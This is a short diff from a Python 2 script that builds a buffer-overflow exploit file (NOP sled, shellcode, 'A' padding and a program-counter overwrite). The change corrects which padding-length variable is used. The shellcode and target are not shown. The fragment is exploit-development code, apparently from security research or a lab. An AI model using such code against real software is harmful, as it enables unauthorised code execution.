@@ -89,7 +89,7 @@ print "{} nops len".format(len(nops))
 print "{} shellcode len".format(len(shellCode))
 print "{} pc overwrite len (this should always be 4)".format(len(pcPivot))
 print "constructing exploit: nops + shellcode + A * {} + pcPivot".format(overflowAdjusted)
-overflow = "A" * overflowPadding
+overflow = "A" * overflowAdjusted
 
 with open(exploit, 'wb') as f:
 	f.write(nops + shellCode + overflow + pcPivot )
